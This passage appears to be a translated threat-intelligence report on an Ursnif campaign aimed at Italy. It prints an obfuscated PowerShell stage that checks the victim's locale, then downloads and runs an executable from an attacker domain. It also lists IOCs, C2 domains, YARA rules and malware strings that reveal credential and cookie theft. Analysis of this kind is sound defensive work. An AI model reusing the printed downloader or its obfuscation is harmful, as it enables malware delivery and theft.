该dll的目的是下载另一个包含一系列命令的PNG图像，通过隐写技术实现隐藏。有趣的是，该库并没有导出函数，加载的代码直接由powershell命令`([SA.Sii]::pf())`调用，其位于**代码片段11**中，在命名空间`SA`内检索`sii`类，并调用静态方法`pf`:

[![](https://p3.ssl.qhimg.com/t011ef0370101da8b9e.png)](https://p3.ssl.qhimg.com/t011ef0370101da8b9e.png)

`pf`方法设计的目的是从合法的`postimg[.cc`平台上下载PNG图像，在这种情况下，隐写技术在另一个控制流分支中具有不同的应用。事实上，恶意软件也使用了一层AES加密。细心的读者能够注意到DLL中所使用的加密体制的特殊性：加密不仅提供了对在线隐写分析的保密性，还提供了对所在国家的检查，以确保受害者是所针对的目标之一。实际上，解密密钥是由当前`CultureInfo`的`LCID`属性生成的，其数据结构提供了计算机的日历、语言和区域设置等信息。

[![](https://p1.ssl.qhimg.com/t01c57a08128884fb32.png)](https://p1.ssl.qhimg.com/t01c57a08128884fb32.png)

[![](https://p3.ssl.qhimg.com/t01486f8061c03151c8.png)](https://p3.ssl.qhimg.com/t01486f8061c03151c8.png)

`pf（）`函数的返回值是隐藏在上图中的payload，显然，这是一个混淆的powershell脚本。和之前的分支一样，该payload包含多层次的重度混淆，这里一共有6层。

[![](https://p2.ssl.qhimg.com/t01c9232dcd7644b3a8.png)](https://p2.ssl.qhimg.com/t01c9232dcd7644b3a8.png)

此分支的第六个powershell阶段包含2个国家/地区的检查，而不仅仅是一个。

第一项检查是`HKCU:Control PanelDesktop`注册表项，其必须具有和`It`字符串匹配的**首选语言**；第二项检查是powershell命令`$`{`host`}`.CurrentCulture`的结果，必须与子字符串`ali*`匹配，明确指定了意大利语。

```
代码片段12:
if((&amp;(‘gp’) (((“`{`0`}``{`4`}``{`3`}``{`1`}``{`5`}``{`2`}`”-f’HKCU:`{`0`}`Control P’,’`}`D’,’sktop’,’l`{`0′,’ane’,’e’))  -f [Char]92) | &amp;(“`{`0`}``{`1`}`” -f ‘Sele’,’ct’) -Property (‘*’)).”p`R`efeRR`EduiL`AnguA`gES” -like (“`{`1`}``{`0`}`” -f’*’,’*t-I’))`{`$`{`GO`}`=(“`{`0`}``{`4`}``{`3`}``{`7`}``{`1`}``{`5`}``{`6`}``{`2`}`” -f’https://newupd’,’///……’,’e’,’f.info///’,’atinde’,’….’,’.ex’,’//’),””;foreach($`{`u`}` in $`{`GO`}`)`{`Try`{`$`{`RI`}` = “$env:tempTwain002.exe”;$`{`k`L`}` = .(“`{`1`}``{`0`}``{`2`}`” -f ‘ec’,’New-Obj’,’t’) (“`{`0`}``{`4`}``{`2`}``{`3`}``{`1`}`” -f ‘System.Ne’,’nt’,’Cl’,’ie’,’t.Web’);$`{`Kl`}`.”Head`ers”.”A`DD”((“`{`2`}``{`1`}``{`0`}``{`3`}`” -f’e’,’r-ag’,’use’,’nt’),(“`{`10`}``{`14`}``{`6`}``{`12`}``{`8`}``{`5`}``{`3`}``{`7`}``{`11`}``{`13`}``{`0`}``{`2`}``{`15`}``{`9`}``{`4`}``{`1`}`”-f’64;’,’Firefox/66.0′,’ rv:6′,’ W’,’ ‘,’10.0;’,’o’,’in’,’ NT ‘,’ Gecko/20100101′,’Mozilla/5.0 (‘,’64; ‘,’ws’,’x’,’Wind’,’6.0)’));$`{`k`L`}`.”DOWNl`oadf`ilE”($`{`u`}`, $`{`r`I`}`);if(($`{`h`osT`}`.“Cu`Rr`En`T`cultURe”| &amp;(“`{`1`}``{`0`}``{`2`}`” -f’-Stri’,’Out’,’ng’)) -like (“`{`1`}``{`0`}`”-f’i*’,’*al’))`{`.(“`{`0`}``{`1`}`”-f ‘S’,’aps’) $`{`Ri`}`;break`}``}`Catch`{`&amp;(“`{`2`}``{`3`}``{`1`}``{`0`}`” -f’t’,’s’,’Write-‘,’Ho’) $`{`_`}`.”EXC`epTION”.”m`ES`SAge”`}``}``}`
```

随后，我们便得到和**加载器**章节中相同的payload。



## 总结

Cybaze-Yoroi ZLAB 团队分析了过去几个月中，许多与ursnif有关的攻击活动，最近的几次活动表明其愈发复杂和狡猾，尤其是在攻击杀伤链的武器化阶段，以及在传递payload时所准备的多层次、高混淆的感染链。

考虑到该恶意软件对于意大利全境的威胁规模和持续性，很明显，这些攻击背后的威胁组织正在大力地利用自动化的攻击武器，并投入资源、时间和金钱来准备复杂的、精准打击的感染链。这些都表明，意大利在持续地受到网络罪犯的攻击，这些攻击者已经达到了一定程度的组织熟练度，并且持续改进其攻击技巧，这都意味着意大利的各公司和组织所面临风险的增加。



## IOCs

#### <a class="reference-link" name="Hashes"></a>Hashes
- bb5dab56181dbb0e8f3f9182a32e584315cd1e6e2fedb2db350e597983f0e880
- abb8a8351bb83037db94cd2bb98a8f697260f32306c21a2198c6b7f1a3bd1957
- 07d340cc0c476e8098a9979714f811e040076666bd8d82e229a89b0b394ae835
- 062389d43ee85c4b1cfda62dc09494db8f99c57aac15b2a237c4929bbf69185d
- f09c85e45d1d764162c44867d8944220e0d8db1cb9ed06fd9b5cc36ae28de4b8
- f2013e97c18531fd5a812f365dbd070e5d7e75192bfbb519261effcfd09fcd89
- f652a3f6cd614caede3ca57d33f530200c07798d3dc19fccf787fb93286dd87a
- 5aaf08c96b9704d7c968bfea8524380e5698e9f478340665623c4ac3b9b9ed24
- b8269764469c32d223840a8733ad08059c475c527079e606ed6aa22dff2f68bb
- 5b82967c329f622b387061c6de3fb05b7a7f2ba48aeef5976882dc4f2a082d67
- 8c33d3df82a671bf5256764468e2c9b15edabe55260393d31fbbc7d90260daf6
- dac0427eebc39d4b789ae71d9944ccfd622ab1da8f242a4c5a46eed32af77469
- ba53cf421f47a08f0cf4d1da95597ffb7199df329c005f2b0b3d96e653455e1a
- 32609cf05b444907eab4b97630b278ea949439dad9aa4c08c01a199cdf971dba
- e9c837c857defea2ab71707fbbde992876b15d51d4a35578d45f89060e722cff
- 2a5319491b4f025078c2a66806dc27f905a43bfc0fd74d4fa871974616a40ee1
- f4a8e0a0a0fda9410c783d5a78ab233432c015fe7017617c3bdbbc4ac2b72fd2
- 7f4996c29d6a9359f54e2afc4fa688aec4c916b27481d62c07a2dbab47f935a4
- b94d0b867b709a5473082168c85cab6e8048ee54c2926c91ca33707b96507fa9
- abb8a8351bb83037db94cd2bb98a8f697260f32306c21a2198c6b7f1a3bd1957
- dd4c52b299b25f1ad217fb4f9a66a915abb79888f9c6553a64949731ad92b4fb
- d89b3415ecc212780144cb3f74c6fea8752052c8d469debf7c12864afd1cd277
- dd377e2673e1f6d070272c9fbb2a63445038c710f7b83c1d8c227050c47a78d1
- 061281bcc63295597216a68eeceb8355b18de9e15768af48e62a9cf413d0ca37
- v2547089727a628ce940ab18554bde85121810cee55857089fd5914b9d972870f
- 5ce8d23dec401142cd35a00ea8d23eedaa64a6f7a08cadbc11c22559d5bdd4bf
- f075570279ac63d38b7933122c1baf82d1ae2151b0accd199f7b56ac93ae9808
- 8578d4261fbe0b899cb57f2c346c0961f3d44a046366d1fb0b453ce821437ab1
- 16b733db9fc27525d11f69457539b92f4ffc7b220ef2d6769705950626461be5
- 6c55e9f85a7cd1232ec94ae9c31f3b0fb2fa597ebad5a5c19e4a5d15fc9e14e0
#### <a class="reference-link" name="Dropurl"></a>Dropurl
- http[://images2[.imgbox[.com/d8/0e/eyGVup7s_o[.png
- https[://newupdatindef[.info////////……….[.exe
- http[s://i.postimg[.cc/mbBH51RX/cry[.png?dl=1
#### <a class="reference-link" name="C2"></a>C2
- filomilalno[.club
- fileneopolo[.online
- reziki[.online
- reziki[.xyz


## Yara Rules

```
import "pe"
rule Ursnif_Excel_Dropper_1905 `{`
meta:
    description = "Yara Rule for Excel Ursnif Dopper of the campaign of End of May 2019"
    author = "Cybaze - Yoroi ZLab"
    last_updated = "2019-06-04"
    tlp = "white"
    category = "informational"
strings:
    $s1 = "TvZjuM4ku8L7D"
    $s2 = "dhgfdd5d6udujdhg9"

    $a1 = `{` 6F 6C 65 3E 02 19 00 73 00 74 00 64 00 6F 00 80 `}`

condition:
    all of them
`}`

rule Ursnif_Loader_1905 `{`
meta:
    description = "Yara Rule for Ursnif Loader of the campaign of End of May 2019"
    author = "Cybaze - Yoroi ZLab"
    last_updated = "2019-06-04"
    tlp = "white"
    category = "informational"
strings:
    $s1 = "&gt;rdP/dfn"
    $s2 = "c:\team\let\Require\livebottom.pdb"

    $a1=`{` E9 5D 3C CD 49 DC 51 C8 `}`

condition:
    all of them
`}`

rule Ursnif_Malicious_DLL_1905 `{`
meta:
    description = "Yara Rule for Ursnif Loader of the campaign of End of May 2019"
    author = "Cybaze - Yoroi ZLab"
    last_updated = "2019-06-04"
    tlp = "white"
    category = "informational"
strings:
    $s1 = "GET t'=PUT t =POSTt"
    $s2 = "xul.dll"
    $s3 = "CHROME_CHILD.DLL"

condition:
    uint16(0) == 0x5A4D and all of them
`}`
```

### <a class="reference-link" name="strings"></a>strings

```
May 26 2019
CHROME.DLL
soft=%u&amp;version=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;crc=%x
version=%u&amp;soft=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;type=%u&amp;name=%s
&amp;ip=%s
&amp;os=%s
%u.%u_%u_%u_x%u
&amp;tor=1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT %u.%u%s)
http://
https://
file://
USER.ID
%lu.exe
/upd %lu
SoftwareAppDataLowSoftwareMicrosoft
Main
Block
Temp
Client
Ini
Keys
Scr
Kill
LastTask
LastConfig
CrHook
OpHook
Exec
.onion
TorClient
TorCrc
%s %s HTTP/1.1
Host: %s
User-Agent: %s
Connection: close;
Content-length: %u
http://constitution.org/usdeclar.txt
C:Program FilesInternet Exploreriexplore.exe
SoftwareMicrosoftWindowsCurrentVersionRun
SystemCurrentControlSetControlSession ManagerAppCertDlls
`{`%08X-%04X-%04X-%04X-%08X%04X`}`
%08X-%04X-%04X-%04X-%08X%04X
S:(ML;;NW;;;LW)D:(A;;0x1fffff;;;WD)(A;;0x1fffff;;;S-1-15-2-1)
open
%lu.bat
attrib -r -s -h %%1
:%u
del %%1
if exist %%1 goto %u
del %%0
Vars
Files
Config
Run
/data.php?version=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;type=%u&amp;name=%s
/UPD
/SD
/sd %lu
SoftwareMicrosoftWindowsCurrentVersion
SOFTWAREMicrosoftWindowsCurrentVersionInternet Settings
NSPR4.DLL
NSS3.DLL
%APPDATA%MozillaFirefoxProfiles
EnableSPDY3_0
MacromediaFlash Player
cookies.sqlite
OPERA.EXE
cookies.sqlite-journal
EMPTY
Cmd %s processed: %u
 | "%s" | %u
Cmd %u parsing: %u
PR_Read
PR_Write
PR_Close
.set MaxDiskSize=0
.set DiskDirectory1="%s"
.set CabinetName1="%s"
.set DestinationDir="%S"
"%s"
setup.inf
setup.rpt
makecab.exe /F "%s"
cmd /C "%s&gt; %s1"
systeminfo.exe 
tasklist.exe /SVC &gt;
driverquery.exe &gt;
reg.exe query "HKLMSOFTWAREMicrosoftWindowsCurrentVersionUninstall" /s &gt;
cmd /U /C "type %s1 &gt; %s &amp; del %s1"
net view &gt;
nslookup 127.0.0.1 &gt;
echo -------- &gt;
nslookup myip.opendns.com resolver1.opendns.com 
Main
Blocked
user_pref("network.http.spdy.enabled", false);
prefs.js
%s=%s&amp;
/images/
.avi
HTTPMail
SMTP
POP3
IMAP
none
WABOpen
SoftwareMicrosoftWindows Mail
SoftwareMicrosoftWindows Live Mail
Store Root
Salt
account`{`*`}`.oeaccount
Server
User_Name
Password2
Port
Secure_Connection
type=%S, name=%S, address=%S, server=%S, port=%u, ssl=%S, user=%S, password=%S
NSS_Init
hostname
type=%S, name=%s, address=%s, server=%s, port=%u, ssl=%s, user=%s, password=%s
NSS_Shutdown
mail
MessageAccount
PK11_FreeSlot
Account_Name
PK11_Authenticate
SMTP_Email_Address
encryptedUsername
%S_%S
encryptedPassword
Email
EmailAddressCollection/EmailAddress[%u]/Address
SoftwareMicrosoftOffice15.0OutlookProfilesOutlook
&amp;uptime=%u
SoftwareMicrosoftWindows NTCurrentVersionWindows Messaging SubsystemProfilesOutlook
Client32
Client64
SoftwareMicrosoftOffice16.0OutlookProfilesOutlook
%systemroot%syswow64cmd.exe
Account Name
/C pause dll
.gif
IMAP Server
IMAP Port
IMAP User
IMAP Password
IMAP Use SSL
.jpeg
POP3 User
POP3 Server
POP3 Port
POP3 Password
POP3 Use SSL
.bmp
.avi
SMTP User
SMTP Server
SMTP Port
SMTP Password
SMTP Use SSL
ICGetInfo
A8000A
ICSendMessage
1.0
nss3.dll
PK11_GetInternalKeySlot
PK11SDR_Decrypt
%systemroot%system32c_1252.nls
%PROGRAMFILES%Mozilla Thunderbird
%USERPROFILE%AppDataRoamingThunderbirdProfiles*.default
logins.json
%S %S, %S, %S
%c%02X
SOFTWAREMicrosoftWindows NTCurrentVersion
InstallDate
\.%s
rundll32
msvfw32
ICOpen
ICClose
ICInfo
rundll32 "%s",%S
DllRegisterServer
IsWow64Process
Wow64EnableWow64FsRedirection
D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)
%userprofile%AppDataLocalGoogleChromeUser DataDefaultcache
%userprofile%AppDataLocalMozillaFirefoxProfiles
```
